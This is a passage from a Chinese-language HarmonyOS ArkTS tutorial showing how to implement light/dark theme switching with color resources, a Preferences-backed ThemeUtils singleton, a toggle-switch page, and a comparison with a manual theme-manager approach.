      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#1E1E1E"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_accent_primary"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#6EA8FE"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_switch_track_on"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#30D158"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app_switch_track_off"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"value"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"#3A3A3C"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-3">1.3 主题管理工具</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// utils/ThemeUtils.ets</span>
<span class="hljs-keyword">import</span> common <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.app.ability.common'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Configuration</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.app.ability.Configuration'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Preferences</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.data.preferences'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ThemeMode</span> {
  <span class="hljs-variable constant_">LIGHT</span> = <span class="hljs-string">'light'</span>,
  <span class="hljs-variable constant_">DARK</span> = <span class="hljs-string">'dark'</span>,
  <span class="hljs-variable constant_">SYSTEM</span> = <span class="hljs-string">'system'</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThemeUtils</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">ThemeUtils</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">appContext</span>: common.<span class="hljs-property">ApplicationContext</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">preferences</span>: <span class="hljs-title class_">Preferences</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-variable constant_">PREF_NAME</span> = <span class="hljs-string">'app_theme_prefs'</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-variable constant_">THEME_KEY</span> = <span class="hljs-string">'current_theme'</span>;
  
  <span class="hljs-comment">// 主题变化监听器</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listeners</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">(<span class="hljs-params">mode: ThemeMode</span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt; = [];
  
  <span class="hljs-comment">// 单例模式</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(): <span class="hljs-title class_">ThemeUtils</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThemeUtils</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-property">instance</span>;
  }
  
  <span class="hljs-comment">// 初始化</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-attr">context</span>: common.<span class="hljs-property">Context</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 获取应用上下文</span>
      <span class="hljs-keyword">const</span> abilityContext = context <span class="hljs-keyword">as</span> common.<span class="hljs-property">UIAbilityContext</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">appContext</span> = abilityContext.<span class="hljs-property">configuration</span>.<span class="hljs-property">appContext</span>;
      
      <span class="hljs-comment">// 初始化Preferences存储</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span> = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Preferences</span>.<span class="hljs-title function_">getPreferences</span>(context, <span class="hljs-variable language_">this</span>.<span class="hljs-property">PREF_NAME</span>);
      
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ThemeUtils 初始化完成'</span>);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ThemeUtils 初始化失败:'</span>, error);
    }
  }
  
  <span class="hljs-comment">// 获取当前主题</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getCurrentTheme</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ThemeMode</span>&gt; {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">SYSTEM</span>;
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> theme = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span>.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">THEME_KEY</span>, <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">SYSTEM</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
      <span class="hljs-keyword">return</span> theme <span class="hljs-keyword">as</span> <span class="hljs-title class_">ThemeMode</span>;
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取主题失败:'</span>, error);
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">SYSTEM</span>;
    }
  }
  
  <span class="hljs-comment">// 切换主题</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">toggleTheme</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> current = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCurrentTheme</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-attr">newTheme</span>: <span class="hljs-title class_">ThemeMode</span>;
    
    <span class="hljs-comment">// 简单切换逻辑：白天 ↔ 夜间</span>
    <span class="hljs-keyword">if</span> (current === <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>) {
      newTheme = <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current === <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>) {
      newTheme = <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 如果是跟随系统，默认切换到夜间</span>
      newTheme = <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>;
    }
    
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setTheme</span>(newTheme);
  }
  
  <span class="hljs-comment">// 设置主题</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">setTheme</span>(<span class="hljs-attr">mode</span>: <span class="hljs-title class_">ThemeMode</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">appContext</span> || !<span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ThemeUtils 未初始化'</span>);
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 保存到Preferences</span>
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span>.<span class="hljs-title function_">put</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">THEME_KEY</span>, mode);
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">preferences</span>.<span class="hljs-title function_">flush</span>();
      
      <span class="hljs-comment">// 应用到系统</span>
      <span class="hljs-keyword">let</span> <span class="hljs-attr">colorMode</span>: <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>;
      
      <span class="hljs-keyword">switch</span> (mode) {
        <span class="hljs-keyword">case</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>:
          colorMode = <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_LIGHT</span>;
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>:
          colorMode = <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_DARK</span>;
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">SYSTEM</span>:
          colorMode = <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_SYSTEM</span>;
          <span class="hljs-keyword">break</span>;
        <span class="hljs-attr">default</span>:
          colorMode = <span class="hljs-title class_">Configuration</span>.<span class="hljs-property">ColorMode</span>.<span class="hljs-property">COLOR_MODE_LIGHT</span>;
      }
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">appContext</span>.<span class="hljs-title function_">setColorMode</span>(colorMode);
      
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`主题已切换为: <span class="hljs-subst">${mode}</span>`</span>);
      
      <span class="hljs-comment">// 通知所有监听器</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">notifyListeners</span>(mode);
      
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'设置主题失败:'</span>, error);
    }
  }
  
  <span class="hljs-comment">// 监听主题变化</span>
  <span class="hljs-title function_">addListener</span>(<span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">mode: ThemeMode</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">push</span>(callback);
  }
  
  <span class="hljs-comment">// 移除监听器</span>
  <span class="hljs-title function_">removeListener</span>(<span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">mode: ThemeMode</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">indexOf</span>(callback);
    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);
    }
  }
  
  <span class="hljs-comment">// 通知所有监听器</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">notifyListeners</span>(<span class="hljs-attr">mode</span>: <span class="hljs-title class_">ThemeMode</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> listener <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-title function_">listener</span>(mode);
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'监听器执行失败:'</span>, error);
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-4">1.4 主页面实现（包含切换开关）</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// pages/Index.ets</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThemeUtils</span>, <span class="hljs-title class_">ThemeMode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/ThemeUtils'</span>;

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">Index</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">currentTheme</span>: <span class="hljs-title class_">ThemeMode</span> = <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">LIGHT</span>;
  <span class="hljs-meta">@State</span> <span class="hljs-attr">isDarkMode</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">false</span>;
  
  <span class="hljs-comment">// 在页面显示时初始化主题</span>
  <span class="hljs-title function_">aboutToAppear</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initTheme</span>();
  }
  
  <span class="hljs-comment">// 初始化主题</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">initTheme</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> themeUtils = <span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-title function_">getInstance</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTheme</span> = <span class="hljs-keyword">await</span> themeUtils.<span class="hljs-title function_">getCurrentTheme</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTheme</span> === <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>;
    
    <span class="hljs-comment">// 监听主题变化</span>
    themeUtils.<span class="hljs-title function_">addListener</span>(<span class="hljs-function">(<span class="hljs-params">mode: ThemeMode</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentTheme</span> = mode;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> = mode === <span class="hljs-title class_">ThemeMode</span>.<span class="hljs-property">DARK</span>;
    });
  }
  
  <span class="hljs-comment">// 切换主题</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">toggleTheme</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> themeUtils = <span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-title function_">getInstance</span>();
    <span class="hljs-keyword">await</span> themeUtils.<span class="hljs-title function_">toggleTheme</span>();
  }
  
  <span class="hljs-comment">// 获取开关状态文字</span>
  <span class="hljs-title function_">getSwitchText</span>(): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> ? <span class="hljs-string">'夜间模式'</span> : <span class="hljs-string">'白天模式'</span>;
  }
  
  <span class="hljs-comment">// 获取模式图标</span>
  <span class="hljs-title function_">getModeIcon</span>(): <span class="hljs-title class_">Resource</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> 
      ? $r(<span class="hljs-string">'app.media.icon_moon'</span>)   <span class="hljs-comment">// 月亮图标（夜间）</span>
      : $r(<span class="hljs-string">'app.media.icon_sun'</span>);   <span class="hljs-comment">// 太阳图标（白天）</span>
  }
  
  <span class="hljs-comment">// 构建界面</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-comment">// 顶部标题栏</span>
      <span class="hljs-title class_">Row</span>() {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">'主题设置'</span>)
          .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">24</span>)
          .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
          .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Medium</span>)
        
        <span class="hljs-title class_">Blank</span>()
        
        <span class="hljs-title class_">Image</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getModeIcon</span>())
          .<span class="hljs-title function_">width</span>(<span class="hljs-number">24</span>)
          .<span class="hljs-title function_">height</span>(<span class="hljs-number">24</span>)
      }
      .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">top</span>: <span class="hljs-number">12</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">12</span> })
      .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_card_bg'</span>))
      
      <span class="hljs-comment">// 主要内容区域</span>
      <span class="hljs-title class_">Scroll</span>() {
        <span class="hljs-title class_">Column</span>() {
          <span class="hljs-comment">// 主题切换卡片</span>
          <span class="hljs-title class_">Column</span>() {
            <span class="hljs-title class_">Row</span>() {
              <span class="hljs-title class_">Column</span>() {
                <span class="hljs-title class_">Text</span>(<span class="hljs-string">'外观模式'</span>)
                  .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">18</span>)
                  .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
                  .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Medium</span>)
                
                <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> ? <span class="hljs-string">'深色主题，保护眼睛'</span> : <span class="hljs-string">'浅色主题，清晰明亮'</span>)
                  .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">14</span>)
                  .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
                  .<span class="hljs-title function_">opacity</span>(<span class="hljs-number">0.6</span>)
                  .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">4</span> })
              }
              .<span class="hljs-title function_">flexGrow</span>(<span class="hljs-number">1</span>)
              
              <span class="hljs-comment">// 主题切换开关</span>
              <span class="hljs-title class_">Toggle</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ToggleType</span>.<span class="hljs-property">Switch</span>, <span class="hljs-attr">isOn</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDarkMode</span> })
                .<span class="hljs-title function_">selectedColor</span>($r(<span class="hljs-string">'app.color.app_switch_track_on'</span>))
                .<span class="hljs-title function_">switchPointColor</span>($r(<span class="hljs-string">'app.color.app_card_bg'</span>))
                .<span class="hljs-title function_">onChange</span>(<span class="hljs-function">(<span class="hljs-params">isOn: <span class="hljs-built_in">boolean</span></span>) =&gt;</span> {
                  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">toggleTheme</span>();
                })
            }
            .<span class="hljs-title function_">padding</span>(<span class="hljs-number">20</span>)
          }
          .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_card_bg'</span>))
          .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)
          .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">20</span> })
          
          <span class="hljs-comment">// 示例内容区域</span>
          <span class="hljs-title class_">Column</span>() {
            <span class="hljs-title class_">Text</span>(<span class="hljs-string">'示例内容'</span>)
              .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">20</span>)
              .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
              .<span class="hljs-title function_">fontWeight</span>(<span class="hljs-title class_">FontWeight</span>.<span class="hljs-property">Bold</span>)
              .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">bottom</span>: <span class="hljs-number">16</span> })
            
            <span class="hljs-title class_">Text</span>(<span class="hljs-string">'这是一个文本示例，用于展示不同主题下的显示效果。在白天模式下，文字为深色；在夜间模式下，文字为浅色。'</span>)
              .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
              .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
              .<span class="hljs-title function_">opacity</span>(<span class="hljs-number">0.8</span>)
              .<span class="hljs-title function_">lineHeight</span>(<span class="hljs-number">24</span>)
            
            <span class="hljs-title class_">Divider</span>()
              .<span class="hljs-title function_">strokeWidth</span>(<span class="hljs-number">1</span>)
              .<span class="hljs-title function_">color</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
              .<span class="hljs-title function_">opacity</span>(<span class="hljs-number">0.1</span>)
              .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">20</span> })
            
            <span class="hljs-title class_">Row</span>() {
              <span class="hljs-title class_">Button</span>(<span class="hljs-string">'主要按钮'</span>)
                .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_accent_primary'</span>))
                .<span class="hljs-title function_">fontColor</span>(<span class="hljs-string">'#FFFFFF'</span>)
                .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
                .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">20</span> })
              
              <span class="hljs-title class_">Button</span>(<span class="hljs-string">'次要按钮'</span>)
                .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_card_bg'</span>))
                .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.app_text_primary'</span>))
                .<span class="hljs-title function_">border</span>({
                  <span class="hljs-attr">color</span>: $r(<span class="hljs-string">'app.color.app_text_primary'</span>),
                  <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                  <span class="hljs-attr">style</span>: <span class="hljs-title class_">BorderStyle</span>.<span class="hljs-property">Solid</span>
                })
                .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">8</span>)
                .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">12</span> })
                .<span class="hljs-title function_">padding</span>({ <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">20</span> })
            }
            .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">16</span> })
          }
          .<span class="hljs-title function_">padding</span>(<span class="hljs-number">24</span>)
          .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_card_bg'</span>))
          .<span class="hljs-title function_">borderRadius</span>(<span class="hljs-number">12</span>)
          .<span class="hljs-title function_">margin</span>({ <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">bottom</span>: <span class="hljs-number">40</span> })
        }
        .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
      }
      .<span class="hljs-title function_">flexGrow</span>(<span class="hljs-number">1</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">backgroundColor</span>($r(<span class="hljs-string">'app.color.app_bg_primary'</span>))
  }
}
</code></pre>
<h3 data-id="heading-5">1.5 在EntryAbility中初始化</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// entry/src/main/ets/entryability/EntryAbility.ets</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThemeUtils</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/ThemeUtils'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">UIAbility</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@ohos.app.ability.UIAbility'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EntryAbility</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">UIAbility</span> {
  <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">want, launchParam</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'EntryAbility onCreate'</span>);
    
    <span class="hljs-comment">// 初始化主题工具</span>
    <span class="hljs-title class_">ThemeUtils</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">initialize</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>);
  }
}
</code></pre>
<h2 data-id="heading-6">二、为什么这是最佳方案？</h2>
<h3 data-id="heading-7">2.1 简单直观，一行代码切换</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 核心切换逻辑，只需一行代码！</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">appContext</span>.<span class="hljs-title function_">setColorMode</span>(colorMode);
</code></pre>
<h3 data-id="heading-8">2.2 自动适配所有组件</h3>
<p>一旦切换系统颜色模式，<strong>所有</strong>使用资源引用的组件都会自动更新：</p>
<ul>
<li>文本颜色</li>
<li>背景颜色</li>
<li>边框颜色</li>
<li>图标资源</li>
<li>甚至图片资源（如果有dark目录版本）</li>
</ul>
<h3 data-id="heading-9">2.3 零耦合，高内聚</h3>
<ul>
<li><strong>业务组件</strong>：只关心<code>$r('app.color.xxx')</code>，不关心当前主题</li>
<li><strong>主题管理</strong>：集中在<code>ThemeUtils</code>，统一管理状态</li>
<li><strong>资源定义</strong>：设计师可以直接修改JSON文件</li>
</ul>
<h3 data-id="heading-10">2.4 持久化存储</h3>
<p>使用Preferences自动保存用户选择，下次启动自动恢复：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 保存主题选择</span>
<span class="hljs-keyword">await</span> preferences.<span class="hljs-title function_">put</span>(<span class="hljs-string">'current_theme'</span>, mode);
<span class="hljs-keyword">await</span> preferences.<span class="hljs-title function_">flush</span>();

<span class="hljs-comment">// 读取主题选择</span>
<span class="hljs-keyword">const</span> theme = <span class="hljs-keyword">await</span> preferences.<span class="hljs-title function_">get</span>(<span class="hljs-string">'current_theme'</span>, <span class="hljs-string">'light'</span>);
</code></pre>
<h2 data-id="heading-11">三、对比工具类方案的劣势</h2>
<p>如果用工具类方案，你需要：</p>
<h3 data-id="heading-12">3.1 繁琐的状态管理</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 每个组件都需要监听主题变化</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">MyComponent</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">textColor</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'#000000'</span>;
  
  <span class="hljs-title function_">aboutToAppear</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 监听主题变化</span>
    <span class="hljs-title class_">ThemeManager</span>.<span class="hljs-title function_">addListener</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">textColor</span> = <span class="hljs-title class_">ThemeManager</span>.<span class="hljs-title function_">getTextColor</span>();
    });
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Text</span>(<span class="hljs-string">'示例'</span>)
      .<span class="hljs-title function_">fontColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">textColor</span>)  <span class="hljs-comment">// 需要状态变量</span>
  }
}
</code></pre>
<h3 data-id="heading-13">3.2 手动更新所有组件</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 切换主题时需要手动更新所有组件</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThemeManager</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">toggleTheme</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDark</span> = !<span class="hljs-variable language_">this</span>.<span class="hljs-property">isDark</span>;
    
    <span class="hljs-comment">// 需要手动触发所有组件更新</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> component <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">registeredComponents</span>) {
      component.<span class="hljs-title function_">updateTheme</span>();
    }
  }
}
</code></pre>
<h3 data-id="heading-14">3.3 性能问题</h3>
<ul>
